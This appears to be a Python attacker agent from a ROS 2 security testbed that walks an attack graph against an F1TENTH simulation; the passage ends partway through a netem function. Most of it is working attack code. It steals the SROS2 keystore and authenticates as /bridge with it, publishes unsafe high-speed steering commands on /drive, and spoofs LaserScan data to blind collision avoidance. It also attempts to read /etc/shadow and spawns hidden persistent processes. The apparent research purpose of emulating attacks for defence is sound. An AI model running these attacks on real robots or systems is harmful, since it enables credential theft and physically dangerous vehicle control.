#!/usr/bin/env python3
"""Attacker agent: walks the MulVAL attack graph, picks an enabled action each step,
rolls the PRISM dice (success / retry / give-up), and runs the real Linux/ROS 2
subprocess for the chosen action (e.g. cp -r keystore, tc qdisc netem, rclpy
publisher to /drive). Marks the predicate on success; trial ends when
systemCompromised is reached, MAX_STEPS hits, or dice rolls give-up."""
import os
import re
import shlex
import time
import json
import subprocess
from collections import defaultdict
from pathlib import Path

NODE_RE = re.compile(r'^\s*(\d+)\s+\[label="([^"]+)"', re.M)
EDGE_RE = re.compile(r'^\s*(\d+)\s*->\s*(\d+)', re.M)

STATE_FILE = os.environ.get("STATE_FILE", "state.json")
LOG_DIR = "logs"
ATTACKER_OUTPUT = os.environ.get("ATTACKER_OUTPUT", "summary").strip().lower()

# Turn-alternation flag written by defender after each _react().
TURN_COMPLETE_PATH = "/tmp/turn_complete.flag"

# Defender's per-turn structured summary (alert, defense, killed, revoked).
DEFENDER_TURN_SUMMARY_PATH = "/tmp/defender_last_turn.json"

# Touched by attacker after each subprocess so defender's watcher advances.
ATTACKER_STEP_DONE_PATH = "/tmp/attacker_step_done.flag"


def _signal_step_done():
    """Touch ATTACKER_STEP_DONE_PATH so the defender's watcher advances."""
    try:
        with open(ATTACKER_STEP_DONE_PATH, "w") as f:
            f.write(f"{time.time()}\n")
    except Exception:
        pass


# Combined real-time log: attacker + defender events interleaved by wallclock.
COMBINED_LOG_PATH = "/tmp/runtime_combined.log"
COMBINED_LOG_START_TS_PATH = "/tmp/runtime_combined.start_ts"


def _combined_log_start_ts():
    """Shared trial-start reference for synced `t=...` across processes."""
    try:
        with open(COMBINED_LOG_START_TS_PATH) as f:
            return float(f.read().strip())
    except (FileNotFoundError, ValueError):
        t0 = time.time()
        try:
            with open(COMBINED_LOG_START_TS_PATH, "w") as f:
                f.write(f"{t0}\n")
        except Exception:
            pass
        return t0


def _combined_log(role, msg):
    """Append a timestamped role-tagged line to the shared combined log."""
    import fcntl
    try:
        t0 = _combined_log_start_ts()
        with open(COMBINED_LOG_PATH, "a") as f:
            fcntl.flock(f.fileno(), fcntl.LOCK_EX)
            t = time.time() - t0
            f.write(f"[t={t:6.2f} {role:>8}] {msg}\n")
            f.flush()
            fcntl.flock(f.fileno(), fcntl.LOCK_UN)
    except Exception:
        pass

SROS2_KEYSTORE_SRC = "/home/f1tenth/sros2_keystore_f1tenth"
SROS2_KEYSTORE_STOLEN = "/tmp/stolen_ros_keystore"


def _activate_stolen_creds():
    """Authenticate subsequent ros_bash subprocesses as /bridge."""
    os.environ["ROS_SECURITY_ENABLE"] = "true"
    os.environ["ROS_SECURITY_STRATEGY"] = "Enforce"
    os.environ["ROS_SECURITY_KEYSTORE"] = SROS2_KEYSTORE_STOLEN
    os.environ["ROS_SECURITY_ENCLAVE_OVERRIDE"] = "/bridge"


def _deactivate_creds():
    """Clear SROS2 env so subsequent subprocesses run unauthenticated."""
    for k in ("ROS_SECURITY_ENABLE", "ROS_SECURITY_STRATEGY",
              "ROS_SECURITY_KEYSTORE", "ROS_SECURITY_ENCLAVE_OVERRIDE"):
        os.environ.pop(k, None)


def _sync_creds_with_state():
    """Mirror credentialAccess predicate state into SROS2 env."""
    state = load_state()
    cred_active = state.get("predicates", {}).get("credentialAccess(robot_host)", False)
    has_meta = state.get("meta", {}).get("has_stolen_creds", False)
    keystore_exists = os.path.isdir(os.path.join(SROS2_KEYSTORE_STOLEN, "enclaves/bridge"))
    if cred_active and has_meta and keystore_exists:
        if os.environ.get("ROS_SECURITY_ENABLE") != "true":
            _activate_stolen_creds()
    else:
        if has_meta or os.environ.get("ROS_SECURITY_ENABLE") == "true":
            state.setdefault("meta", {})["has_stolen_creds"] = False
            save_state(state)
            _deactivate_creds()


def _intensity():
    """Return current dice outcome: 'success', 'retry', or 'give_up'."""
    return os.environ.get("ATTACK_INTENSITY", "success").lower()


def _intensity_describe(success_label, retry_reason, give_up_reason):
    """Pick the per-intensity narrative line for the turn summary."""
    intensity = _intensity()
    if intensity == "success":
        note = f"FULL  — {success_label}"
    elif intensity == "retry":
        note = f"PARTIAL — {retry_reason}"
    elif intensity == "give_up":
        note = f"TOKEN — {give_up_reason}"
    else:  # 'chain' or unknown
        note = ""
    if note:
        os.environ["ATTACK_INTENSITY_NOTE"] = note
        print(f"[ATTACKER]  {note}")


def wait_for_defender_turn(attack_start_ts, timeout=None):
    """Block until defender's turn-complete flag is newer than attack_start_ts."""
    if timeout is None:
        timeout = float(os.environ.get("TURN_TIMEOUT_SEC", "5.0"))
    deadline = time.time() + timeout
    while time.time() < deadline:
        if os.path.exists(TURN_COMPLETE_PATH):
            try:
                with open(TURN_COMPLETE_PATH) as f:
                    first = f.readline().strip()
                ts = float(first)
                if ts > attack_start_ts:
                    return True
            except (ValueError, IOError, OSError):
                pass
        time.sleep(0.05)
    return False

_THIS_DIR = str(Path(__file__).resolve().parent)
ROS_SETUP = os.environ.get(
    "ATTACK_ROS_SETUP",
    (
        "source /opt/ros/foxy/setup.bash && "
        "(source ./install/setup.bash 2>/dev/null || true) && "
        f"(source '{_THIS_DIR}/install/setup.bash' 2>/dev/null || true)"
    ),
)

TARGET = (
    "/home/f1tenth/sim_ws/install/f1tenth_gym_ros/lib/python3.8/"
    "site-packages/f1tenth_gym_ros/gym_bridge.py"
)
CLEAN = TARGET + ".clean"

BRIDGE_EXEC = (
    "/home/f1tenth/sim_ws/install/f1tenth_gym_ros/lib/"
    "f1tenth_gym_ros/gym_bridge"
)

BRIDGE_KILL_PATTERN = (
    "/home/f1tenth/sim_ws/install/f1tenth_gym_ros/lib/"
    "f1tenth_gym_ros/gym_bridge --ros-args -r __node:=bridge "
    "--params-file /home/f1tenth/sim_ws/install/f1tenth_gym_ros/share/"
    "f1tenth_gym_ros/config/sim.yaml"
)

def parse_pred(label: str):
    """Extract the predicate name from a MulVAL node label, or None."""
    parts = label.split(":")
    if len(parts) < 3:
        return None
    mid = ":".join(parts[1:-1])
    if mid.startswith("RULE"):
        return None
    return mid


def parse_truth(label: str):
    """Return the truth flag from a MulVAL node label (True/False/None)."""
    parts = label.split(":")
    if len(parts) < 3:
        return None
    last = parts[-1].strip()
    if last == "1":
        return True
    if last == "0":
        return False
    return None


def is_rule(label: str) -> bool:
    """Return True if the MulVAL label denotes a rule node."""
    parts = label.split(":")
    return len(parts) >= 2 and parts[1].startswith("RULE")


def normalize_state(state):
    """Ensure state dict has all required top-level keys and defaults."""
    if not isinstance(state, dict):
        state = {}
    state.setdefault("facts", {})
    state.setdefault("predicates", {})
    state.setdefault("smg", {})
    state.setdefault("meta", {})
    state["smg"].setdefault("t", 1)
    return state


def load_state():
    """Read and normalize the shared state file from disk."""
    if not os.path.exists(STATE_FILE):
        return normalize_state({})
    with open(STATE_FILE, "r") as f:
        return normalize_state(json.load(f))


def save_state(s):
    """Atomically write the normalized state dict back to disk."""
    s = normalize_state(s)
    # Atomic write so defender never sees a half-written state.json.
    tmp_path = f"{STATE_FILE}.tmp.{os.getpid()}"
    with open(tmp_path, "w") as f:
        json.dump(s, f, indent=2, sort_keys=True)
    os.replace(tmp_path, STATE_FILE)


def achieved(state, pred):
    """Return True if predicate is set either as fact or achieved predicate."""
    state = normalize_state(state)
    return bool(
        state["facts"].get(pred, False) or
        state["predicates"].get(pred, False)
    )


def fact_true(state, pred):
    """Return True if predicate is recorded as a base fact."""
    state = normalize_state(state)
    return bool(state["facts"].get(pred, False))


def pred_true(state, pred):
    """Return True if predicate is recorded as achieved."""
    state = normalize_state(state)
    return bool(state["predicates"].get(pred, False))


def mark_fact(state, pred, why=""):
    """Set predicate as a base fact and persist state."""
    state = normalize_state(state)
    state["facts"][pred] = True
    if why:
        state["meta"][f"why::{pred}"] = why
    save_state(state)


def _is_blocked(state, pred):
    """True if defender has an unexpired block on this predicate."""
    blocked = state.get("meta", {}).get("blocked_predicates", {})
    expiry = blocked.get(pred, 0)
    try:
        return float(expiry) > time.time()
    except (TypeError, ValueError):
        return False


def mark_pred(state, pred, why=""):
    """Mark predicate as achieved unless defender currently blocks it."""
    state = normalize_state(state)
    # Re-read blocks from disk: defender may have written during attacker's subprocess.
    try:
        fresh = load_state()
        state["meta"]["blocked_predicates"] = (
            fresh.get("meta", {}).get("blocked_predicates", {})
        )
    except Exception:
        pass
    if _is_blocked(state, pred):
        print(f"[ATTACKER] BLOCKED: refusing to mark {pred} — "
              f"defender has active block on it")
        return
    state["predicates"][pred] = True
    if why:
        state["meta"][f"why::{pred}"] = why
    state.get("meta", {}).pop(f"revoked_by_defender::{pred}", None)
    save_state(state)


def set_smg(state, key, value=True):
    """Set an SMG flag in the state and persist."""
    state = normalize_state(state)
    state["smg"][key] = value
    save_state(state)


def set_turn(state, t_value):
    """Update the SMG turn counter and persist state."""
    state = normalize_state(state)
    state["smg"]["t"] = int(t_value)
    save_state(state)


def log(name, text):
    """Write text to a timestamped log file under LOG_DIR."""
    os.makedirs(LOG_DIR, exist_ok=True)
    path = os.path.join(LOG_DIR, f"{name}_{time.strftime('%Y%m%d-%H%M%S')}.txt")
    with open(path, "w") as f:
        f.write(text)
    if ATTACKER_OUTPUT in {"full", "verbose", "1"}:
        print("[LOG]", path)
    return path


def sh(cmd, timeout=None):
    """Run a subprocess command and return (returncode, combined_output)."""
    if ATTACKER_OUTPUT in {"full", "verbose", "1"}:
        print("\n[CMD]", " ".join(cmd))
    try:
        p = subprocess.run(cmd, text=True, capture_output=True, timeout=timeout)
        out = (p.stdout or "") + (p.stderr or "")
        return p.returncode, out
    except subprocess.TimeoutExpired as e:
        out = (e.stdout or "") + (e.stderr or "")
        out = (out if isinstance(out, str) else (out.decode() if out else ""))
        out += f"\n[TIMEOUT] command exceeded {timeout} seconds"
        if ATTACKER_OUTPUT in {"full", "verbose", "1"}:
            print(out)
        return 124, out
    except Exception as e:
        out = f"[EXCEPTION] {type(e).__name__}: {e}"
        if ATTACKER_OUTPUT in {"full", "verbose", "1"}:
            print(out)
        return 1, out


def ros_bash(cmd: str, timeout=None):
    """Run a ros2 CLI command, inheriting SROS2 env vars if active."""
    return sh(["bash", "-lc", f"{ROS_SETUP} && {cmd}"], timeout=timeout)


def topic_info_v(topic):
    """Return verbose ros2 topic info output, or None on failure."""
    rc, out = ros_bash(f"ros2 topic info {topic} -v")
    log("topic_info_v", out)
    if rc != 0:
        return None
    return out


def topic_type(topic):
    """Return the ros2 message type string for a topic, or None."""
    rc, out = ros_bash(f"ros2 topic type {topic}")
    log("topic_type", out)
    if rc != 0:
        return None
    return out.strip().splitlines()[-1].strip() if out.strip() else None


def node_list():
    """Return the output of ros2 node list, or None on failure."""
    rc, out = ros_bash("ros2 node list", timeout=10)
    log("node_list", out)
    if rc != 0:
        return None
    return out


def node_info(node_name):
    """Return ros2 node info output for the given node, or None."""
    rc, out = ros_bash(f"ros2 node info {node_name}", timeout=10)
    log("node_info", out)
    if rc != 0:
        return None
    return out


def restore_clean_bridge():
    """Restore the bridge executable from its clean backup copy."""
    if not os.path.exists(CLEAN):
        print(f"[FAIL] clean backup not found: {CLEAN}")
        return False
    rc, out = sh(["bash", "-lc", f"cp '{CLEAN}' '{TARGET}'"])
    log("restore_clean_bridge", out)
    return rc == 0


def patch_first_matching_line(contains_text: str, new_lines: str):
    """Replace the first bridge line containing contains_text with new_lines."""
    p = Path(TARGET)
    lines = p.read_text().splitlines()
    out = []
    done = False

    for line in lines:
        if (contains_text in line) and (not done):
            indent = line[:len(line) - len(line.lstrip())]
            for nl in new_lines.split("\n"):
                out.append(indent + nl)
            done = True
        else:
            out.append(line)

    p.write_text("\n".join(out) + "\n")
    return done


def restart_patched_bridge(logfile="/tmp/bridge_attack.log"):
    """Kill the existing bridge process and respawn the patched one."""
    pattern = (
        "/home/f1tenth/sim_ws/install/f1tenth_gym_ros/lib/f1tenth_gym_ros/gym_bridge "
        "--ros-args -r __node:=bridge "
        "--params-file /home/f1tenth/sim_ws/install/f1tenth_gym_ros/share/f1tenth_gym_ros/config/sim.yaml"
    )

    rc1, out1 = sh([
        "bash", "-lc",
        f"pgrep -f \"{pattern}\" || true"
    ], timeout=10)
    log("restart_patched_bridge_pgrep", out1)

    pids = []
    for line in out1.splitlines():
        line = line.strip()
        if line.isdigit():
            pids.append(line)

    for pid in pids:
        rc2, out2 = sh(["bash", "-lc", f"kill -TERM {pid} || true"], timeout=10)
        log(f"restart_patched_bridge_kill_{pid}", out2)

    time.sleep(2)

    cmd = (
        "nohup /usr/bin/python3 "
        "/home/f1tenth/sim_ws/install/f1tenth_gym_ros/lib/f1tenth_gym_ros/gym_bridge "
        "--ros-args -r __node:=bridge "
        "--params-file /home/f1tenth/sim_ws/install/f1tenth_gym_ros/share/f1tenth_gym_ros/config/sim.yaml "
        f">{logfile} 2>&1 &"
    )
    rc3, out3 = sh(["bash", "-lc", cmd], timeout=10)
    log("restart_patched_bridge_nohup", out3)

    time.sleep(5)

    rc4, out4 = sh([
        "bash", "-lc",
        f"pgrep -af \"{pattern}\" || true"
    ], timeout=10)
    log("restart_patched_bridge_ps", out4)

    return bool(out4.strip())


def _pgrep(pattern):
    """True if some other process has `pattern` in its cmdline (via /proc)."""
    import re
    rx = re.compile(pattern)
    self_pid = os.getpid()
    try:
        for entry in os.listdir("/proc"):
            if not entry.isdigit():
                continue
            pid = int(entry)
            if pid == self_pid:
                continue
            try:
                with open(f"/proc/{pid}/cmdline", "rb") as f:
                    raw = f.read()
            except (FileNotFoundError, PermissionError):
                continue
            cmdline = raw.replace(b"\0", b" ").decode("utf-8", errors="ignore")
            if rx.search(cmdline):
                return True
        return False
    except Exception:
        return False


def _spawn_marker(name, cmd=None):
    """Spawn idempotent long-lived background process labelled `name`."""
    if _pgrep(name):
        return
    if cmd is None:
        spawn_cmd = f"exec -a {name} sleep 86400"
    else:
        spawn_cmd = f"exec -a {name} bash -c {shlex.quote(cmd)}"
    subprocess.Popen(
        ["bash", "-c", spawn_cmd],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        start_new_session=True,
    )


def _spawn_rclpy_participant(node_name):
    """Spawn idempotent rclpy Node visible in `ros2 node list`."""
    if _pgrep(node_name):
        return
    # MUST NOT subscribe to /scan or /odom — would trip REQ_data_leaked falsely.
    script = (
        "import time, sys\n"
        "while True:\n"
        "    try:\n"
        "        import rclpy\n"
        "        from rclpy.node import Node\n"
        "        rclpy.init()\n"
        f"        n = Node('{node_name}')\n"
        "        rclpy.spin(n)\n"
        "    except Exception as e:\n"
        "        sys.stderr.write(f'rclpy participant failed: {e!r}\\n')\n"
        "        try:\n"
        "            rclpy.shutdown()\n"
        "        except Exception:\n"
        "            pass\n"
        "        time.sleep(5)\n"
    )
    quoted = shlex.quote(script)
    subprocess.Popen(
        ["bash", "-c",
         f"{ROS_SETUP} && exec -a {node_name} python3 -c {quoted}"],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        start_new_session=True,
    )


def act_graph_discovery_bridge():
    """Recon the ROS graph."""
    intensity = _intensity()
    if intensity == "success":
        _spawn_marker(
            "attacker_recon_graph",
            cmd=(f"{ROS_SETUP} && "
                 "while true; do ros2 node list > /dev/null 2>&1; sleep 2; done"),
        )
        node_list()
        return True
    if intensity == "retry":
        node_list()
        print("[ATTACKER] RETRY: ros2 node list returned filtered/empty result")
        return False
    print("[ATTACKER] GIVE_UP: rmw discovery timeout before listing nodes")
    return False


def act_initial_access_engineering_ws():
    """Foothold on engineering_ws."""
    intensity = _intensity()
    if intensity == "success":
        rc, out = sh(["bash", "-lc", "whoami && hostname && id"], timeout=8)
        log("initial_access_engineering_ws", out)
        if not (rc == 0 and bool(out.strip())):
            return False
        _spawn_marker(
            "attacker_engineering_ws_compromised",
            cmd="while true; do "
                "ls /home/f1tenth/sim_ws/install > /tmp/.attacker_recon_listing 2>&1; "
                "sleep 5; done",
        )
        return True
    if intensity == "retry":
        rc, out = sh(["bash", "-lc", "whoami && hostname"], timeout=4)
        log("initial_access_engineering_ws", out)
        print("[ATTACKER] RETRY: enumerated host but foothold didn't persist")
        return False
    sh(["bash", "-lc", "chmod +x /etc/passwd 2>/tmp/.attacker_initial_eperm; true"], timeout=4)
    print("[ATTACKER] GIVE_UP: chmod /etc/passwd returned EPERM")
    return False


def act_lateral_access_robot_host():
    """Lateral pivot to robot_host."""
    host = os.environ.get("ATTACK_ROBOT_HOST", "127.0.0.1").strip()
    intensity = _intensity()
    if intensity == "success":
        sh(["bash", "-lc", f"nc -z {host} 7400 > /tmp/.attacker_lateral_probe 2>&1"], timeout=4)
        log("lateral_access_robot_host", f"LATERAL_OK {host}\n")
        _spawn_marker(
            "attacker_lateral_robot_host",
            cmd=f"while true; do "
                f"nc -z {host} 7400 > /tmp/.attacker_lateral_probe 2>&1; "
                f"sleep 5; done",
        )
        return True
    if intensity == "retry":
        sh(["bash", "-lc", f"nc -z {host} 7400 2>&1"], timeout=4)
        print("[ATTACKER] RETRY: probed reachable but no persistent pivot")
        return False
    sh(["bash", "-lc", f"nc -z {host} 9999 2>&1"], timeout=4)
    print("[ATTACKER] GIVE_UP: firewall blocked lateral probe")
    return False


def act_credential_access_robot_host():
    """Steal the bridge SROS2 enclave keystore so subsequent ros2 calls auth as /bridge."""
    bridge_enclave = os.path.join(SROS2_KEYSTORE_SRC, "enclaves/bridge")
    if not os.path.isdir(bridge_enclave):
        print("[ATTACKER] SROS2 keystore not found; using symbolic cred theft")
        sh(["bash", "-lc", "touch /tmp/stolen_ros_creds"], timeout=4)
        _spawn_marker("attacker_creds_obtained")
        return True

    # Real cred theft: copy the bridge enclave AND CA cert.
    rc, out = sh(
        ["bash", "-lc",
         f"rm -rf {SROS2_KEYSTORE_STOLEN} 2>/dev/null; "
         f"cp -r {SROS2_KEYSTORE_SRC} {SROS2_KEYSTORE_STOLEN} && "
         f"test -r {SROS2_KEYSTORE_STOLEN}/enclaves/bridge/key.pem && "
         f"echo CRED_OK"],
        timeout=8,
    )
    log("credential_access_robot_host", out)
    if "CRED_OK" not in out:
        return False

    _activate_stolen_creds()

    state = load_state()
    state.setdefault("meta", {})["has_stolen_creds"] = True
    save_state(state)

    sh(["bash", "-lc", "touch /tmp/stolen_ros_creds"], timeout=4)
    _spawn_marker(
        "attacker_creds_obtained",
        cmd=f"while true; do "
            f"ls {SROS2_KEYSTORE_STOLEN}/enclaves/bridge > /tmp/.attacker_creds_verify 2>&1; "
            f"sleep 5; done",
    )
    print(f"[ATTACKER] stolen SROS2 keystore copied to {SROS2_KEYSTORE_STOLEN};"
          " subsequent attacks authenticate as /bridge")
    return True


def act_attacker_on_ros_network_robot_host():
    """Place the attacker on the ROS network via persistent probing."""
    if _intensity() == "success":
        _spawn_marker(
            "attacker_on_ros_network",
            cmd=f"while true; do "
                f"bash -c '{ROS_SETUP} && ros2 node list' > /tmp/.attacker_node_listing 2>&1; "
                f"sleep 5; done",
        )
    rc, out = ros_bash("ros2 node list", timeout=10)
    log("attacker_on_ros_network_robot_host", out)
    return os.path.isdir("/opt/ros/foxy")


def act_attacker_can_join_ros_graph_robot_host():
    """Join the ROS graph by spawning an rclpy participant node."""
    if _intensity() == "success":
        _spawn_rclpy_participant("attacker_ros_participant")
    rc, out = ros_bash("ros2 topic list -t", timeout=10)
    log("attacker_can_join_ros_graph_robot_host", out)
    return os.path.isdir("/opt/ros/foxy")


def act_attacker_can_netadmin_robot_host():
    """CAP_NET_ADMIN privilege escalation."""
    intensity = _intensity()
    if intensity == "success":
        sh(["bash", "-lc", "sudo -n tc qdisc show dev lo > /tmp/attacker_netadmin.log 2>&1 || true"],
           timeout=4)
        _spawn_marker(
            "attacker_net_admin",
            cmd="while true; do "
                "sudo -n tc qdisc show dev lo > /tmp/.attacker_tc_probe 2>&1; "
                "sleep 5; done",
        )
        return True
    if intensity == "retry":
        sh(["bash", "-lc", "sudo -n -v > /tmp/.attacker_netadmin_retry 2>&1"], timeout=4)
        print("[ATTACKER] RETRY: sudo authentication required, escalation didn't persist")
        return False
    # give_up: explicit denied operation
    sh(["bash", "-lc", "sudo -n cat /etc/shadow > /tmp/.attacker_netadmin_giveup 2>&1"], timeout=4)
    print("[ATTACKER] GIVE_UP: no privileged sudo")
    return False


def act_target_node_selected_bridge():
    """Recon target node."""
    intensity = _intensity()
    if intensity == "success":
        _spawn_marker(
            "attacker_targeting_bridge",
            cmd=(f"{ROS_SETUP} && "
                 "while true; do ros2 node info /bridge > /dev/null 2>&1; sleep 5; done"),
        )
        node_info("/bridge") or node_info("bridge")
        return True
    if intensity == "retry":
        ros_bash("ros2 node info /nonexistent_target > /dev/null 2>&1", timeout=8)
        print("[ATTACKER] RETRY: targeting attempt hit nonexistent node")
        return False
    print("[ATTACKER] GIVE_UP: node-info call refused")
    return False


def act_code_location_known_bridge():
    """Recon: locate target source."""
    intensity = _intensity()
    if intensity == "success":
        sh(["bash", "-lc", f"stat '{TARGET}' > /tmp/bridge_recon.log 2>&1 || true"], timeout=4)
        _spawn_marker(
            "attacker_recon_bridge_source",
            cmd=f"while true; do "
                f"stat '{TARGET}' > /tmp/.attacker_bridge_stat 2>&1; "
                f"sleep 5; done",
        )
        return True
    if intensity == "retry":
        sh(["bash", "-lc", "stat /etc/passwd > /tmp/.attacker_codeloc_retry 2>&1"], timeout=4)
        print("[ATTACKER] RETRY: stat'd wrong path; source not where attacker thought")
        return False
    sh(["bash", "-lc", "ls /tmp/nonexistent_attacker_target > /tmp/.attacker_codeloc_giveup 2>&1"],
       timeout=4)
    print("[ATTACKER] GIVE_UP: target not deployed at expected path")
    return False


def act_compromised_ros_node_bridge():
    """Recon: confirm target writable."""
    intensity = _intensity()
    if intensity == "success":
        sh(["bash", "-lc", f"touch -a '{TARGET}' || true"], timeout=4)
        _spawn_marker(
            "attacker_bridge_write_capable",
            cmd=f"while true; do "
                f"touch -a '{TARGET}' > /tmp/.attacker_bridge_write_probe 2>&1; "
                f"sleep 5; done",
        )
        return True
    if intensity == "retry":
        sh(["bash", "-lc", "touch -a /etc/passwd > /tmp/.attacker_writecap_retry 2>&1"], timeout=4)
        print("[ATTACKER] RETRY: target file not writable (EPERM)")
        return False
    print("[ATTACKER] GIVE_UP: integrity verification rejected attacker's writes")
    return False


def act_topic_write_drive():
    """Publish dangerous AckermannDrive commands on /drive for several seconds."""
    print("[ATTACKER]  FULL — 4 s @ 30 Hz, speed 4.0 m/s, hard left "
          "— car accelerates dangerously")
    secs, rate, speed, steer = 4, 30, 4.0, 0.6
    path = _write_attack_script("attacker_drive_writer", f'''
import rclpy, time, sys
try:
    from rclpy.node import Node
    from ackermann_msgs.msg import AckermannDriveStamped
    rclpy.init()
    n = rclpy.create_node("attacker_drive_writer")
    pub = n.create_publisher(AckermannDriveStamped, "/drive", 10)
    deadline = time.time() + 8.0
    while time.time() < deadline and pub.get_subscription_count() == 0:
        time.sleep(0.25)
    if pub.get_subscription_count() == 0:
        sys.stderr.write("BRIDGE_REJECTED: no /drive subscriber visible (auth fail)\\n")
        n.destroy_node(); rclpy.shutdown()
        sys.exit(2)
    msg = AckermannDriveStamped()
    msg.drive.speed = {speed}
    msg.drive.steering_angle = {steer}
    msg.header.frame_id = "evil_drive_writer"
    end = time.time() + {secs}
    period = 1.0 / {rate}
    while time.time() < end:
        pub.publish(msg)
        time.sleep(period)
    n.destroy_node()
    rclpy.shutdown()
    print("PUBLISH_OK")
except Exception as e:
    sys.stderr.write(f"rclpy auth/pub failed: {{e!r}}\\n")
    sys.exit(1)
''')
    rc, out = ros_bash(f"python3 {path}", timeout=secs + 10)
    log("topic_write_drive", out)
    return "PUBLISH_OK" in out


def act_topic_write_scan():
    """Publish rogue LaserScan messages on /scan to blind collision avoidance."""
    print("[ATTACKER]  FULL — 4 s @ 15 Hz of rogue /scan with range=999.0 "
          "— collision avoidance blinded")
    secs, rate = 4, 15
    path = _write_attack_script("attacker_scan_writer", f'''
import rclpy, time, sys
try:
    from rclpy.node import Node
    from sensor_msgs.msg import LaserScan
    rclpy.init()
    n = rclpy.create_node("attacker_scan_writer")
    pub = n.create_publisher(LaserScan, "/scan", 10)
    deadline = time.time() + 8.0
    while time.time() < deadline and pub.get_subscription_count() == 0:
        time.sleep(0.25)
    if pub.get_subscription_count() == 0:
        sys.stderr.write("BRIDGE_REJECTED: no /scan subscriber visible (auth fail)\\n")
        n.destroy_node(); rclpy.shutdown()
        sys.exit(2)
    msg = LaserScan()
    msg.header.frame_id = "evil_scan_writer"
    msg.angle_min = 0.0
    msg.angle_max = 0.1
    msg.angle_increment = 0.01
    msg.range_min = 0.0
    msg.range_max = 999.0
    msg.ranges = [999.0, 999.0, 999.0]
    end = time.time() + {secs}
    period = 1.0 / {rate}
    while time.time() < end:
        pub.publish(msg)
        time.sleep(period)
    n.destroy_node()
    rclpy.shutdown()
    print("PUBLISH_OK")
except Exception as e:
    sys.stderr.write(f"rclpy auth/pub failed: {{e!r}}\\n")
    sys.exit(1)
''')
    rc, out = ros_bash(f"python3 {path}", timeout=secs + 10)
    log("topic_write_scan", out)
    return "PUBLISH_OK" in out


def runtime_scan_msg_for_mode(mode: str, scale_factor: str):
    """Build a malicious LaserScan YAML payload for the given mode."""
    if mode == "close":
        ranges = "[0.1,0.1,0.1,0.1,0.1,0.1,0.1,0.1,0.1,0.1]"
    elif mode == "far":
        ranges = "[30.0,30.0,30.0,30.0,30.0,30.0,30.0,30.0,30.0,30.0]"
    elif mode == "noise":
        ranges = "[0.3,22.0,1.1,15.0,0.6,18.0,2.0,25.0,0.8,20.0]"
    elif mode == "blindspot":
        ranges = "[0.0,0.0,0.0,0.0,0.0,15.0,14.5,13.9,12.0,10.0]"
    elif mode == "reverse":
        ranges = "[10.0,9.0,8.0,7.0,6.0,5.0,4.0,3.0,2.0,1.0]"
    elif mode == "scale":
        sf = float(scale_factor)
        vals = [round(v * sf, 2) for v in [1.0, 2.0, 3.0, 4.0, 5.0, 6.0]]
        ranges = "[" + ",".join(str(v) for v in vals) + "]"
    else:
        return None

    return (
        "{header: {frame_id: 'evil_scan_writer'}, "
        "angle_min: -1.57, angle_max: 1.57, angle_increment: 0.314, "
        "time_increment: 0.0, scan_time: 0.0, range_min: 0.0, range_max: 999.0, "
        f"ranges: {ranges}, intensities: []}}"
    )


def runtime_publish_malicious_scan(mode: str, scale_factor: str, qos_reliability: str):
    """Publish malicious /scan; shared by maliciousTopicContent and qosDegradation."""
    intensity = _intensity()
    duration, rate = 6, 15
    sf = float(scale_factor)
    range_patterns = {
        "close": [0.1] * 10,
        "far":   [30.0] * 10,
        "noise": [0.3, 22.0, 1.1, 15.0, 0.6, 18.0, 2.0, 25.0, 0.8, 20.0],
        "blindspot": [0.0, 0.0, 0.0, 0.0, 0.0, 15.0, 14.5, 13.9, 12.0, 10.0],
        "reverse": [10.0, 9.0, 8.0, 7.0, 6.0, 5.0, 4.0, 3.0, 2.0, 1.0],
        "scale": [round(v * sf, 2) for v in [1.0, 2.0, 3.0, 4.0, 5.0, 6.0]],
    }
    ranges_list = range_patterns.get(mode)
    if ranges_list is None:
        print(f"[FAIL] unknown ATTACK_SCAN_MODE={mode}")
        return False

    range_min_v = 0.0
    range_max_v = 999.0
    if qos_reliability == "best_effort":
        node_label = "attacker_qos_degrader"
        if intensity == "success":
            actual_qos = "best_effort"
            actual_rate = rate
        elif intensity == "retry":
            actual_qos = "reliable"
            actual_rate = rate
        else:
            actual_qos = "best_effort"
            actual_rate = 0
    else:
        node_label = "attacker_scan_corrupter"
        actual_qos = "default"
        if intensity == "success":
            actual_rate = rate
        elif intensity == "retry":
            range_min_v = 0.0
            range_max_v = 0.01
            actual_rate = rate
        else:
            ranges_list = []
            actual_rate = rate
            duration = 0.5
    ranges_repr = repr(ranges_list)
    qos_setup = ""
    if actual_qos == "best_effort":
        qos_setup = (
            "    from rclpy.qos import QoSProfile, ReliabilityPolicy\n"
            "    qos = QoSProfile(depth=10)\n"
            "    qos.reliability = ReliabilityPolicy.BEST_EFFORT\n"
        )
        pub_create = "n.create_publisher(LaserScan, '/scan', qos)"
    elif actual_qos == "reliable":
        qos_setup = (
            "    from rclpy.qos import QoSProfile, ReliabilityPolicy\n"
            "    qos = QoSProfile(depth=10)\n"
            "    qos.reliability = ReliabilityPolicy.RELIABLE\n"
        )
        pub_create = "n.create_publisher(LaserScan, '/scan', qos)"
    else:
        pub_create = "n.create_publisher(LaserScan, '/scan', 10)"

    publish_loop = (
        f"end = time.time() + {duration}\n"
        f"    period = 1.0 / {actual_rate} if {actual_rate} > 0 else 1.0\n"
        f"    while time.time() < end:\n"
        f"        if {actual_rate} > 0:\n"
        f"            pub.publish(msg)\n"
        f"        time.sleep(period)"
    )
    path = _write_attack_script(node_label, f'''
import rclpy, time, sys
try:
    from rclpy.node import Node
    from sensor_msgs.msg import LaserScan
    rclpy.init()
    n = rclpy.create_node("{node_label}")
{qos_setup}    pub = {pub_create}
    time.sleep(2)
    msg = LaserScan()
    msg.header.frame_id = "evil_scan_content"
    msg.angle_min = -1.57
    msg.angle_max = 1.57
    msg.angle_increment = 0.314
    msg.range_min = {range_min_v}
    msg.range_max = {range_max_v}
    msg.ranges = {ranges_repr}
    {publish_loop}
    n.destroy_node()
    rclpy.shutdown()
    print("PUBLISH_OK_{intensity}")
except Exception as e:
    sys.stderr.write(f"rclpy auth/pub failed: {{e!r}}\\n")
    sys.exit(1)
''')
    rc, out = ros_bash(f"python3 {path}", timeout=int(duration) + 10)
    log("runtime_publish_malicious_scan", out)
    return "PUBLISH_OK_success" in out

def runtime_apply_netem(rule: str):
    """Install a tc-netem qdisc rule on the attack interface."""
    iface = os.environ.get("ATTACK_NETEM_IFACE", "").strip()
    if not iface:
        print("[FAIL] ATTACK_NETEM_IFACE is required for runtime delay/drop attacks")
        return False

